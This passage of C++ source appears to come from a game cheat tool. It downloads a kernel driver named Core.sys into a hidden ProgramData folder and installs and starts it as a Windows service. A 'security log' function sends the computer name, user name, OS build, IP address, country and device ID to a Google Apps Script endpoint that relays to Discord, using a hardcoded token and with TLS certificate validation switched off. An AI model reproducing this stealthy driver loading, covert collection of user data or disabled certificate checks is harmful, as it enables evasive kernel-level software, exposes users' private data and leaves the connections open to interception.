                std::string utf8Hidden(hiddenDriverPath.begin(), hiddenDriverPath.end());
            }

            if (!DownloadFileToPath(driverUrlText.c_str(), hiddenDriverPath)) {
                std::cerr << "DownloadFileToPath(driverUrl) failed." << std::endl;
                output_log_message("[Driver] DownloadFileToPath(driverUrl) FAILED.\n");
                set_ui_notice(UINoticeLevel::Error,
                              "Driver",
                              "Driver download failed. Check internet/antivirus and try again.",
                              std::string("URL: ") + driverUrlText);
            } else {
                driverExistsInHidden = FileExistsW(hiddenDriverPath);
            }
        }
    }

    // Compatibility/debug: also check for Core.sys next to the executable
    std::wstring exeDir = GetExecutableDirectoryW();
    std::wstring exeDriverPath;
    if (!exeDir.empty()) {
        exeDriverPath = exeDir + L"\\Core.sys";
    }

    bool driverExistsNextToExe = (!exeDriverPath.empty() && FileExistsW(exeDriverPath));

    if (!exeDriverPath.empty()) {
        std::string utf8Exe(exeDriverPath.begin(), exeDriverPath.end());
        output_log_message("[Driver] EXE-adjacent driver path: " + utf8Exe + " Exists: " + (driverExistsNextToExe ? std::string("true") : std::string("false")) + "\n");
    }

    // If hidden path is still missing but the driver exists next to the executable, try to copy it
    if (!driverExistsInHidden && driverExistsNextToExe) {
        std::cerr << "Driver file found next to executable. Copying to hidden ProgramData path." << std::endl;

        if (CopyFileW(exeDriverPath.c_str(), hiddenDriverPath.c_str(), FALSE)) {
            driverExistsInHidden = true;
        } else {
            std::cerr << "CopyFileW from exe directory to hidden path failed. Using exe path directly." << std::endl;
        }
    }

    // Decide which path to use for service installation
    std::wstring driverPathForService;
    if (driverExistsInHidden) {
        driverPathForService = hiddenDriverPath;
    } else if (driverExistsNextToExe) {
        driverPathForService = exeDriverPath;
        std::string utf8Path(driverPathForService.begin(), driverPathForService.end());
        std::cerr << "Using driver file next to executable as fallback. Path: " << utf8Path << std::endl;
        output_log_message("[Driver] Using driver file next to executable as fallback. Path: " + utf8Path + "\n");
    } else {
        std::cerr << "Driver file not found in any known location after download attempts." << std::endl;
        output_log_message("[Driver] Driver file not found in any known location after download attempts.\n");
        set_ui_notice(UINoticeLevel::Error,
                      "Connection Faild to Connect",
                      "Please reinstall or place driver next to the executable.");
        return false;
    }

    const std::wstring serviceName = L"Core"; // Kernel driver service name for Core.sys
    if (!InstallAndStartCoreDriver(serviceName, driverPathForService)) {
        std::string utf8Path(driverPathForService.begin(), driverPathForService.end());
        std::cerr << "InstallAndStartCoreDriver(driver) failed. Path: " << utf8Path << std::endl;
        output_log_message("[Driver] InstallAndStartCoreDriver(driver) FAILED. Path: " + utf8Path + "\n");
        set_ui_notice(UINoticeLevel::Error,
                      "Driver",
                      "Driver installation/start failed. Some features may not work.",
                      std::string("Driver path: ") + utf8Path);
        return false;
    }

    std::string utf8FinalPath(driverPathForService.begin(), driverPathForService.end());
    std::cerr << "Driver installed/started successfully. Path: " << utf8FinalPath << std::endl;
    output_log_message("[Driver] Driver service installed/started successfully. Path: " + utf8FinalPath + "\n");
    return true;
}

// Forward declarations
// ... 

#ifdef _MSC_VER
#pragma comment(lib, "winmm.lib") // Link against winmm.lib for PlaySound (MSVC specific)
#pragma comment(lib, "wininet.lib") // Link against wininet.lib for HTTP requests (MSVC specific)
#endif

// Gamma Control Globals & Functions
// For GetDC, ReleaseDC, GetDeviceGammaRamp, SetDeviceGammaRamp (requires wingdi.h, usually pulled by windows.h)
// For WORD (requires windef.h, usually pulled by windows.h)

static WORD g_originalGammaRamp[3][256];
static WORD g_boostedGammaRamp[3][256];
static bool g_isGammaInitialized = false; // Tracks if original ramp is successfully read
static bool g_isGammaBoosted = false;     // Tracks if boosted ramp is currently active

std::atomic<bool> g_isLoggedIn{false}; // Tracks user login status
static bool g_nightModeKeyPressedLastFrame = false; // Track key press state for Night Mode

// Forward declaration for the function to be called by atexit
void EnsureOriginalGammaBeforeExit();

void InitializeGammaControls() {
    if (g_isGammaInitialized) return; // Already initialized

    HWND desktopWindow = GetDesktopWindow();
    HDC hdc = GetDC(desktopWindow); // Get DC for the entire screen
    if (hdc) {
        if (GetDeviceGammaRamp(hdc, g_originalGammaRamp)) {
            g_isGammaInitialized = true; // Mark as initialized
            printf("Original gamma ramp successfully saved.\n");

            // Create the "boosted" gamma ramp
            // This example sets a very high brightness.
            // Create a boosted gamma ramp using a gamma curve (e.g., gamma = 0.5 for brighter image)
            double boost_gamma_value = 0.3; // Values < 1.0 make the image brighter, 0.3 is quite bright
            printf("Creating boosted gamma ramp with gamma factor: %.2f (Increased Brightness)...\n", boost_gamma_value);
            for (int channel = 0; channel < 3; ++channel) {
                for (int i = 0; i < 256; ++i) {
                    double normalized_input = i / 255.0;
                    double corrected_value = pow(normalized_input, boost_gamma_value);
                    double scaled_value = corrected_value * 65535.0;
                    if (scaled_value > 65535.0) scaled_value = 65535.0;
                    if (scaled_value < 0.0) scaled_value = 0.0;
                    g_boostedGammaRamp[channel][i] = (WORD)(scaled_value);
                    // Clamp to ensure it's within WORD range, though pow(0..1, positive_gamma) should yield 0..1
                    // (Clamping is done on scaled_value before casting.)
                }
            }
            printf("Boosted gamma ramp created (using gamma curve, factor: %.2f - Increased Brightness).\n", boost_gamma_value);
            // Print a few sample values from the original gamma ramp for debugging
            printf("Sample original gamma (Channel 0): R[0]=%u, R[128]=%u, R[255]=%u\n", 
                   g_originalGammaRamp[0][0], g_originalGammaRamp[0][128], g_originalGammaRamp[0][255]);
            printf("Sample original gamma (Channel 1): G[0]=%u, G[128]=%u, G[255]=%u\n", 
                   g_originalGammaRamp[1][0], g_originalGammaRamp[1][128], g_originalGammaRamp[1][255]);
            printf("Sample original gamma (Channel 2): B[0]=%u, B[128]=%u, B[255]=%u\n", 
                   g_originalGammaRamp[2][0], g_originalGammaRamp[2][128], g_originalGammaRamp[2][255]);
        } else {
            // Failed to get the original gamma ramp
            printf("Error: GetDeviceGammaRamp failed.\n");
            // g_isGammaInitialized remains false
        }
        ReleaseDC(desktopWindow, hdc);
    } else {
        printf("Error: Could not get DC for desktop window.\n");
        printf("Error: Could not get DC for desktop window in InitializeGammaControls.\n"); // Log
        // g_isGammaInitialized remains false, and no original ramp is stored
    }

    // Register the gamma restoration function to be called on normal program exit
    if (std::atexit(EnsureOriginalGammaBeforeExit) != 0) {
        printf("Error: Failed to register EnsureOriginalGammaBeforeExit with atexit.\n");
        // Handle error if registration fails, though it's rare for atexit to fail if the function signature is correct.
    } else {
        printf("EnsureOriginalGammaBeforeExit registered with atexit successfully.\n");
    }
}

void ApplyBoostedGamma() {
    if (!g_isGammaInitialized) {
        printf("Error: Gamma not initialized. Cannot apply boosted gamma.\n");
        printf("Error: Gamma not initialized. Cannot apply boosted gamma.\n"); // Log
        return;
    }
    if (g_isGammaBoosted) {
        printf("Gamma boost is already active.\n");
        printf("Gamma boost is already active.\n"); // Log
        return;
    }

    HWND desktopWindow = GetDesktopWindow();
    HDC hdc = GetDC(desktopWindow);
    if (hdc) {
        if (SetDeviceGammaRamp(hdc, g_boostedGammaRamp)) {
            g_isGammaBoosted = true;
            printf("Boosted gamma ramp applied.\n");
            printf("Boosted gamma ramp applied.\n"); // Log
        } else {
            printf("Error: SetDeviceGammaRamp failed to apply boosted gamma.\n");
            printf("Error: SetDeviceGammaRamp failed to apply boosted gamma.\n"); // Log
        }
        ReleaseDC(desktopWindow, hdc);
    } else {
        printf("Error: Could not get DC for desktop window.\n");
        printf("Error: Could not get DC for desktop window when applying boosted gamma.\n"); // Log
    }
}

void RestoreOriginalGamma() {
    if (!g_isGammaInitialized) {
        printf("Warning: Gamma not initialized. Cannot restore original gamma.\n");
        printf("Warning: Gamma not initialized. Cannot restore original gamma.\n"); // Log
        return;
    }

    HWND desktopWindow = GetDesktopWindow();
    HDC hdc = GetDC(desktopWindow);
    if (hdc) {
        if (SetDeviceGammaRamp(hdc, g_originalGammaRamp)) {
            g_isGammaBoosted = false; // مهم: وضعیت را به‌روز کنید
            printf("Original gamma ramp restored.\n");
            printf("Original gamma ramp restored.\n"); // Log
        } else {
            printf("Error: SetDeviceGammaRamp failed to restore original gamma.\n");
            printf("Error: SetDeviceGammaRamp failed to restore original gamma.\n"); // Log
        }
        ReleaseDC(desktopWindow, hdc);
    } else {
        printf("Error: Could not get DC for desktop window when restoring gamma.\n");
        printf("Error: Could not get DC for desktop window when restoring gamma.\n"); // Log
    }
}

// --- تابع جدید برای بررسی و بازگرداندن گاما قبل از خروج ---
// این تابع باید قبل از بسته شدن کامل برنامه فراخوانی شود.
void EnsureOriginalGammaBeforeExit() {
    printf("EnsureOriginalGammaBeforeExit called. g_isGammaInitialized: %s, g_isGammaBoosted: %s\n",
           g_isGammaInitialized ? "true" : "false",
           g_isGammaBoosted ? "true" : "false"); // Log with states
    if (g_isGammaInitialized && g_isGammaBoosted) {
        printf("Gamma boost is active. Attempting to restore original gamma...\n"); // Log
        RestoreOriginalGamma();
    } else if (!g_isGammaInitialized) {
        printf("Gamma was not initialized. No action needed for gamma restoration.\n"); // Log
    } else {
        printf("Gamma boost is not active. Original gamma should be set. No action needed.\n"); // Log
    }
}

void ApplyCurrentGammaRamp() {
    if (!g_isGammaInitialized) {
        printf("Gamma controls not initialized. Cannot apply ramp.\n");
        return;
    }

    HWND desktopWindow = GetDesktopWindow();
    HDC hdc = GetDC(desktopWindow);
    if (hdc) {
        BOOL success;
        if (g_isGammaBoosted) {
            printf("[GAMMA_LOG_ID_004] Attempting to apply boosted gamma ramp...\n");
            success = SetDeviceGammaRamp(hdc, g_boostedGammaRamp);
            if (success) {
                printf("[GAMMA_LOG_ID_005] SetDeviceGammaRamp for boosted ramp SUCCEEDED. Gamma/Brightness boosted.\n");
            } else {
                DWORD errorCode = GetLastError();
                printf("[GAMMA_LOG_ID_006] SetDeviceGammaRamp for boosted ramp FAILED. Error. LastError: %lu\n", errorCode);
            }
        } else { // Restoring original gamma
            printf("[GAMMA_LOG_ID_001] Attempting to apply original (captured) gamma ramp...\n");
            success = SetDeviceGammaRamp(hdc, g_originalGammaRamp);
            if (success) {
                printf("[GAMMA_LOG_ID_002] SetDeviceGammaRamp for original ramp SUCCEEDED. Gamma/Brightness restored to original.\n");
            } else {
                DWORD errorCode = GetLastError();
                printf("[GAMMA_LOG_ID_003] SetDeviceGammaRamp for original ramp FAILED. Error. LastError: %lu\n", errorCode);
            }
        }
        ReleaseDC(desktopWindow, hdc);
    } else {
        printf("Error: GetDC(desktopWindow) failed. Cannot apply gamma ramp.\n");
    }
}
[[maybe_unused]] static bool g_endKeyPressedLastFrame = false; // For End key state
// End Gamma Control Globals & Functions

#ifdef _MSC_VER
#pragma comment(lib, "iphlpapi.lib") // Link against iphlpapi.lib for MAC address (MSVC specific)
#pragma comment(lib, "d3d11.lib") // Link against d3d11.lib (MSVC specific)
#pragma comment(lib, "dwmapi.lib") // Link against dwmapi.lib (for MSVC)
#pragma comment(lib, "dxgi.lib") // Link against dxgi.lib for GPU info
#endif

// کلاس مدیریت پنجره برای بهبود عملکرد مخفی/نمایش
class WindowManager {
public:
    // مقدار دهی اولیه
    static void Initialize(HWND hWnd) {
        s_hWnd = hWnd;
        s_isVisible = true;
        s_lastToggleTime = std::chrono::steady_clock::now();
    }

    // تغییر وضعیت نمایش پنجره
    static void ToggleVisibility() {
        // بررسی محدودیت زمانی برای جلوگیری از تغییر سریع وضعیت
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - s_lastToggleTime).count();
        
        // اگر کمتر از 500 میلی‌ثانیه از تغییر قبلی گذشته باشد، تغییر جدید را نادیده بگیر
        if (elapsed < 500) {
            return;
        }
        
        s_lastToggleTime = now;
        s_isVisible = !s_isVisible;
        
        if (s_isVisible) {
            // نمایش پنجره
            ShowWindow(s_hWnd, SW_SHOW);
            SetForegroundWindow(s_hWnd);
            // بازسازی رابط کاربری
            s_needsRebuild = true;
        } else {
            // مخفی کردن پنجره
            ShowWindow(s_hWnd, SW_HIDE);
        }
    }
    
    // بررسی نیاز به بازسازی رابط کاربری
    static bool NeedsRebuild() {
        if (s_needsRebuild) {
            s_needsRebuild = false;
            return true;
        }
        return false;
    }
    
    // بررسی وضعیت نمایش پنجره
    static bool IsVisible() {
        return s_isVisible;
    }

private:
    static HWND s_hWnd;
    static std::atomic<bool> s_isVisible;
    static std::atomic<bool> s_needsRebuild;
    static std::chrono::steady_clock::time_point s_lastToggleTime;
};

// تعریف متغیرهای استاتیک
HWND WindowManager::s_hWnd = NULL;
std::atomic<bool> WindowManager::s_isVisible(true);
std::atomic<bool> WindowManager::s_needsRebuild(false);
std::chrono::steady_clock::time_point WindowManager::s_lastToggleTime = std::chrono::steady_clock::now();
#ifdef _MSC_VER
#pragma comment(lib, "advapi32.lib") // Link library for registry functions
#pragma comment(lib, "psapi.lib") // Link library for EnumProcessModules
#endif
// اعلان توابع مورد نیاز برای ارسال لاگ‌های امنیتی
// این اعلان‌ها باید قبل از تعریف تابع send_security_log_to_api باشند

// تابع جدید برای دریافت زمان فعلی به صورت رشته
// توابع get_current_time_string و get_mac_address قبلاً در کد تعریف شده‌اند
// بنابراین نیازی به تعریف مجدد آنها نیست

void output_log_message(const std::string& message);
std::string generate_device_id();
extern const std::string APP_VERSION_NUMBER;
std::string get_user_ip(); // اعلان تابع get_user_ip



std::once_flag g_device_id_once_flag;
std::string g_cached_device_id;
std::once_flag g_user_ip_once_flag;
std::string g_cached_user_ip;

std::once_flag g_user_country_once_flag;
std::string g_cached_user_country;

std::string get_cached_device_id() {
    std::call_once(g_device_id_once_flag, []() {
        g_cached_device_id = generate_device_id();
    });
    return g_cached_device_id;
}

std::string get_cached_user_ip() {
    std::call_once(g_user_ip_once_flag, []() {
        try {
            g_cached_user_ip = get_user_ip();
        } catch (...) {
            g_cached_user_ip = "Unknown";
        }
        if (g_cached_user_ip.empty() || g_cached_user_ip == "unknown_ip") {
            g_cached_user_ip = "Unknown";
        }
    });
    return g_cached_user_ip;
}

std::string get_country_name_for_ip(const std::string& ip);

std::string get_cached_user_country() {
    std::call_once(g_user_country_once_flag, []() {
        try {
            g_cached_user_country = get_country_name_for_ip(get_cached_user_ip());
        } catch (...) {
            g_cached_user_country = "Unknown";
        }
        if (g_cached_user_country.empty()) {
            g_cached_user_country = "Unknown";
        }
    });
    return g_cached_user_country;
}



// تابع رمزگذاری و رمزگشایی با الگوریتم XOR
inline std::string xor_encrypt_decrypt(const std::string& input, const std::string& key) {
    std::string output = input;
    for (size_t i = 0; i < input.size(); ++i) {
        output[i] = input[i] ^ key[i % key.size()];
    }
    return output;
}

// تابع رمزگذاری و رمزگشایی با الگوریتم XOR در خط 140 تعریف شده است

// متغیرهای ALL_PROFILES و current_gun_profile_str در جای دیگری از کد تعریف شده‌اند

// تابع کمکی برای URL-encode کردن رشته‌ها
std::string url_encode(const std::string &value) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;

    for (std::string::const_iterator i = value.begin(); i != value.end(); ++i) {
        std::string::value_type c = (*i);

        // رزرو کردن کاراکترهای مجاز در URL
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
            continue;
        }

        // فضای خالی را بدون تغییر نگه می‌داریم
        if (c == ' ') {
            escaped << " ";
            continue;
        }

        // سایر کاراکترها را به صورت %XX انکود می‌کنیم
        escaped << '%' << std::setw(2) << int((unsigned char) c);
    }

    return escaped.str();
}

extern "C" BOOLEAN NTAPI SystemFunction036(PVOID RandomBuffer, ULONG RandomBufferLength);

std::string bytes_to_hex(const std::vector<unsigned char>& bytes) {
    std::ostringstream oss;
    oss << std::hex << std::setfill('0');
    for (unsigned char b : bytes) {
        oss << std::setw(2) << static_cast<int>(b);
    }
    return oss.str();
}

std::string generate_nonce() {
    std::vector<unsigned char> bytes(16, 0);
    if (!SystemFunction036(bytes.data(), static_cast<ULONG>(bytes.size()))) {
        unsigned long long tick = GetTickCount64();
        DWORD pid = GetCurrentProcessId();
        DWORD tid = GetCurrentThreadId();
        for (size_t i = 0; i < bytes.size(); ++i) {
            unsigned char mix = static_cast<unsigned char>(tick >> ((i % 8) * 8));
            mix ^= static_cast<unsigned char>(pid >> ((i % 4) * 8));
            mix ^= static_cast<unsigned char>(tid >> ((i % 4) * 8));
            bytes[i] = mix;
        }
    }
    return bytes_to_hex(bytes);
}

std::string get_unix_timestamp_seconds() {
    auto now = std::chrono::system_clock::now();
    auto seconds = std::chrono::duration_cast<std::chrono::seconds>(now.time_since_epoch()).count();
    return std::to_string(seconds);
}

bool constant_time_equals(const std::string& a, const std::string& b) {
    if (a.size() != b.size()) {
        return false;
    }
    unsigned char diff = 0;
    for (size_t i = 0; i < a.size(); ++i) {
        diff |= static_cast<unsigned char>(a[i] ^ b[i]);
    }
    return diff == 0;
}

std::string base64_encode(const std::vector<unsigned char>& data) {
    static const char kBase64Chars[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    unsigned char a3[3];
    unsigned char a4[4];
    int i = 0;

    for (unsigned char c : data) {
        a3[i++] = c;
        if (i == 3) {
            a4[0] = (a3[0] & 0xfc) >> 2;
            a4[1] = ((a3[0] & 0x03) << 4) + ((a3[1] & 0xf0) >> 4);
            a4[2] = ((a3[1] & 0x0f) << 2) + ((a3[2] & 0xc0) >> 6);
            a4[3] = a3[2] & 0x3f;

            for (i = 0; i < 4; ++i) {
                out.push_back(kBase64Chars[a4[i]]);
            }
            i = 0;
        }
    }

    if (i) {
        for (int j = i; j < 3; ++j) {
            a3[j] = 0;
        }
        a4[0] = (a3[0] & 0xfc) >> 2;
        a4[1] = ((a3[0] & 0x03) << 4) + ((a3[1] & 0xf0) >> 4);
        a4[2] = ((a3[1] & 0x0f) << 2) + ((a3[2] & 0xc0) >> 6);
        a4[3] = a3[2] & 0x3f;

        for (int j = 0; j < i + 1; ++j) {
            out.push_back(kBase64Chars[a4[j]]);
        }
        while (i++ < 3) {
            out.push_back('=');
        }
    }

    return out;
}

std::string base64_url_encode(const std::vector<unsigned char>& data) {
    std::string out = base64_encode(data);
    for (char& c : out) {
        if (c == '+') c = '-';
        else if (c == '/') c = '_';
    }
    return out;
}

std::vector<unsigned char> hmac_sha256_bytes(const std::string& key, const std::string& message) {
    const size_t block_size = 64;
    std::vector<unsigned char> key_block(block_size, 0x00);

    if (key.size() > block_size) {
        std::vector<unsigned char> hashed(picosha2::k_digest_size);
        picosha2::hash256(key.begin(), key.end(), hashed.begin(), hashed.end());
        std::copy(hashed.begin(), hashed.end(), key_block.begin());
    } else {
        std::copy(key.begin(), key.end(), key_block.begin());
    }

    std::vector<unsigned char> o_key_pad(block_size);
    std::vector<unsigned char> i_key_pad(block_size);
    for (size_t i = 0; i < block_size; ++i) {
        o_key_pad[i] = static_cast<unsigned char>(key_block[i] ^ 0x5c);
        i_key_pad[i] = static_cast<unsigned char>(key_block[i] ^ 0x36);
    }

    std::vector<unsigned char> inner_data;
    inner_data.reserve(block_size + message.size());
    inner_data.insert(inner_data.end(), i_key_pad.begin(), i_key_pad.end());
    inner_data.insert(inner_data.end(), message.begin(), message.end());

    std::vector<unsigned char> inner_hash(picosha2::k_digest_size);
    picosha2::hash256(inner_data.begin(), inner_data.end(), inner_hash.begin(), inner_hash.end());

    std::vector<unsigned char> outer_data;
    outer_data.reserve(block_size + inner_hash.size());
    outer_data.insert(outer_data.end(), o_key_pad.begin(), o_key_pad.end());
    outer_data.insert(outer_data.end(), inner_hash.begin(), inner_hash.end());

    std::vector<unsigned char> out_hash(picosha2::k_digest_size);
    picosha2::hash256(outer_data.begin(), outer_data.end(), out_hash.begin(), out_hash.end());
    return out_hash;
}

std::string stable_stringify(const nlohmann::json& value) {
    if (value.is_null()) {
        return "null";
    }
    if (value.is_boolean() || value.is_number() || value.is_string()) {
        return value.dump();
    }
    if (value.is_array()) {
        std::string out = "[";
        bool first = true;
        for (const auto& item : value) {
            if (!first) {
                out += ",";
            }
            first = false;
            out += stable_stringify(item);
        }
        out += "]";
        return out;
    }
    if (value.is_object()) {
        std::vector<std::string> keys;
        keys.reserve(value.size());
        for (auto it = value.begin(); it != value.end(); ++it) {
            keys.push_back(it.key());
        }
        std::sort(keys.begin(), keys.end());
        std::string out = "{";
        bool first = true;
        for (const auto& key : keys) {
            if (!first) {
                out += ",";
            }
            first = false;
            out += nlohmann::json(key).dump();
            out += ":";
            out += stable_stringify(value.at(key));
        }
        out += "}";
        return out;
    }
    return value.dump();
}

bool verify_response_signature(const nlohmann::json& response,
                               const std::string& secret,
                               const std::string& expected_nonce,
                               std::string& out_error) {
    if (!expected_nonce.empty()) {
        if (!response.contains("nonce") || !response["nonce"].is_string()) {
            out_error = "Missing nonce in response.";
            return false;
        }
        if (response["nonce"].get<std::string>() != expected_nonce) {
            out_error = "Nonce mismatch.";
            return false;
        }
    }

    if (secret.empty()) {
        return true;
    }

    if (!response.contains("signature") || !response["signature"].is_string()) {
        out_error = "Missing signature.";
        return false;
    }

    nlohmann::json payload = response;
    payload.erase("signature");
    std::string signature_base = stable_stringify(payload);
    std::vector<unsigned char> mac = hmac_sha256_bytes(secret, signature_base);
    std::string expected_sig = base64_url_encode(mac);
    std::string actual_sig = response["signature"].get<std::string>();

    if (!constant_time_equals(expected_sig, actual_sig)) {
        out_error = "Signature mismatch.";
        return false;
    }

    return true;
}

// متغیرهای سراسری برای بخش اعلانات
std::string g_announcement_text = "Loading announcements...";
std::mutex g_announcement_mutex;
std::atomic<bool> g_announcement_loaded(false);
std::atomic<bool> g_announcement_fetch_initiated(false);
const char* ANNOUNCEMENT_URL = "https://script.google.com/macros/s/AKfycbyUxk-ozjNV_nArgEYRMvmWBKDjkg_42K4a56VZXw7jGhBVr7JuKZ-ANoqhwCXGZCurbw/exec?mode=announcement";

// تابع جدید برای ارسال لاگ‌های امنیتی به API
void send_security_log_to_api(const std::string& security_threat_type, const std::string& details) {
    try {
        // دریافت زمان دقیق رخداد
        auto now = std::chrono::system_clock::now();
        auto now_time_t = std::chrono::system_clock::to_time_t(now);
        std::tm local_tm;
        localtime_s(&local_tm, &now_time_t);
        char time_buffer[80];
        strftime(time_buffer, sizeof(time_buffer), "%Y-%m-%d %H:%M:%S", &local_tm);
        std::string timestamp(time_buffer);
        
        // دریافت اطلاعات سیستم
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        
        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(MEMORYSTATUSEX);
        GlobalMemoryStatusEx(&memInfo);
        
        // دریافت نام کامپیوتر
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD computerNameSize = sizeof(computerName);
        GetComputerNameA(computerName, &computerNameSize);
        
        // دریافت نام کاربر
        char username[UNLEN + 1];
        DWORD usernameSize = sizeof(username);
        GetUserNameA(username, &usernameSize);
        
        // دریافت نسخه ویندوز
        OSVERSIONINFOEXA osInfo;
        osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
        
        // توجه: این تابع در ویندوز 10 به بعد منسوخ شده است
        // اما برای اهداف لاگینگ استفاده می‌کنیم
        #ifdef _MSC_VER
        #pragma warning(disable: 4996)
        #endif
        GetVersionExA((OSVERSIONINFOA*)&osInfo);
        #ifdef _MSC_VER
        #pragma warning(default: 4996)
        #endif
        
        // دریافت اطلاعات پروسه فعلی
        HANDLE hProcess = GetCurrentProcess();
        PROCESS_MEMORY_COUNTERS pmc;
        GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc));
        
        // ابتدا لاگ را در کنسول نمایش می‌دهیم - با اطلاعات بیشتر
        std::string enhanced_log = "Security Alert [" + timestamp + "]: " + security_threat_type + " - " + details + "\n";
        enhanced_log += "System: " + std::string(computerName) + ", User: " + std::string(username) + "\n";
        enhanced_log += "OS: Windows " + std::to_string(osInfo.dwMajorVersion) + "." + std::to_string(osInfo.dwMinorVersion) + ", Build: " + std::to_string(osInfo.dwBuildNumber) + "\n";
        enhanced_log += "App Version: " + std::string(APP_VERSION_NUMBER) + "\n";
        
        output_log_message(enhanced_log);
        
        // بررسی اتصال به اینترنت
        DWORD flags;
        if (!InternetGetConnectedState(&flags, 0)) {
            output_log_message("ERROR: No internet connection available. Cannot send security log.\n");
            return;
        }
        
        // ساختن device_id
        std::string device_id_hashed = get_cached_device_id();
        
        // دریافت IP کاربر (این عملیات ممکن است کمی زمان ببرد)
        std::string user_ip = get_cached_user_ip(); // مقدار پیش‌فرض

        std::string user_country = get_cached_user_country();
        
        // لاگ کردن اطلاعات ارسالی برای دیباگ
        output_log_message("Sending security log - Device ID: " + device_id_hashed + ", IP: " + user_ip + ", Country: " + user_country + "\n");

        std::string token = "mysecrettoken";

        // URL-encode کردن پارامترها
        std::string encoded_threat_type = url_encode(security_threat_type);
        std::string encoded_details = url_encode(details);
        std::string encoded_device_id = url_encode(device_id_hashed);
        std::string encoded_ip = url_encode(user_ip);
        std::string encoded_country = url_encode(user_country);
        std::string encoded_version = url_encode(APP_VERSION_NUMBER);
        std::string encoded_token = url_encode(token);
        
        // ساختن URL بدون پارامترها - استفاده از POST به جای GET
        std::string base_api_url = "https://script.google.com/macros/s/AKfycbxOc0VWnwC8yetGtRhABAqQDvTZCurwE5NqQ0Aifzu4ylhC3GuuPOxyARKhTiLCXqc-Tg/exec";
        
        // ساختن پیام برای ارسال به دیسکورد
        std::string message = "Security Alert: " + encoded_threat_type + " - " + encoded_details + 
                           "\nDevice ID: " + encoded_device_id + 
                           "\nIP Address: " + encoded_ip + 
                           "\nCountry: " + encoded_country + 
                           "\nVersion: " + encoded_version;
        
        // ساختن داده‌های POST برای ارسال به سرور
        std::string post_data = "token=" + encoded_token + "&message=" + url_encode(message);
        
        // ارسال درخواست به API با متد POST
        HINTERNET hInternet = InternetOpen(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Application Client", // User-Agent مناسب
            INTERNET_OPEN_TYPE_DIRECT,  // اتصال مستقیم بدون پروکسی
            NULL, NULL, 0);
            
        if (!hInternet) {
            DWORD error = GetLastError();
            output_log_message("Failed to initialize WinINet for security log. Error code: " + std::to_string(error) + "\n");
            return;
        }
        
        // تنظیم timeout برای اطمینان از عدم انسداد برنامه
        DWORD timeout = 15000; // 15 seconds
        InternetSetOption(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
        InternetSetOption(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
        InternetSetOption(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
        
        // تنظیم برای استفاده از HTTPS
        DWORD security_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | 
                             SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | 
                             SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        
        // اعمال تنظیمات امنیتی
        InternetSetOption(hInternet, INTERNET_OPTION_SECURITY_FLAGS, &security_flags, sizeof(security_flags));
        
        // باز کردن اتصال به سرور - استفاده از متد POST صحیح
        // ابتدا باید یک اتصال به سرور باز کنیم
        HINTERNET hConnect = InternetConnect(
            hInternet,
            "script.google.com",  // نام هاست
            INTERNET_DEFAULT_HTTPS_PORT,
            NULL, NULL,
            INTERNET_SERVICE_HTTP,
            0, 0);
            
        if (!hConnect) {
            DWORD error = GetLastError();
            output_log_message("Failed to connect to server. Error code: " + std::to_string(error) + "\n");
            InternetCloseHandle(hInternet);
            return;
        }
        
        // حالا یک درخواست POST ایجاد می‌کنیم
        HINTERNET hRequest = HttpOpenRequest(
            hConnect,
            "POST",  // متد POST
            "/macros/s/AKfycbxaWs-NMsr3aQuAus9qSyy1h5MEDL76PNIZ-fmmxYvL2wdvZ2mpUrRnsCKIXlyt3EDyfw/exec",  // مسیر
            NULL,
            NULL,
            NULL,
            INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE,
            0);
            
        if (!hRequest) {
            DWORD error = GetLastError();
            output_log_message("Failed to create HTTP request. Error code: " + std::to_string(error) + "\n");
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return;
        }
        
        // اعمال تنظیمات امنیتی برای درخواست
        InternetSetOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &security_flags, sizeof(security_flags));
        
        // اضافه کردن هدرهای مناسب برای POST
        HttpAddRequestHeaders(
            hRequest,
            "Content-Type: application/x-www-form-urlencoded\r\n",
            -1,
            HTTP_ADDREQ_FLAG_ADD);
        
        // ارسال درخواست POST با داده‌ها
        BOOL result = HttpSendRequest(
            hRequest,
            NULL, 0,
            (LPVOID)post_data.c_str(),
            post_data.length());
            
        if (!result) {
            DWORD error = GetLastError();
            output_log_message("Failed to send HTTP request. Error code: " + std::to_string(error) + "\n");
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return;
        }
        
        output_log_message("POST request sent successfully\n");
        
        // خواندن پاسخ از سرور
        output_log_message("Reading response from server...\n");
        
        std::string response_body;
        char buffer[4096];
        DWORD bytes_read = 0;
        
        // خواندن پاسخ از درخواست HTTP
        while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytes_read) && bytes_read > 0) {
            buffer[bytes_read] = '\0';
            response_body.append(buffer);
        }
        
        // بستن تمام اتصالات
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        
        // لاگ کردن نتیجه ارسال
        if (!response_body.empty()) {
            output_log_message("Security log API response: " + response_body + "\n");
            
            // بررسی پاسخ سرور
            if (response_body.find("Sent") != std::string::npos) {
                output_log_message("Security log successfully sent to Discord!\n");
            } else if (response_body.find("Error") != std::string::npos) {
                output_log_message("Error from server: " + response_body + "\n");
            }
        } else {
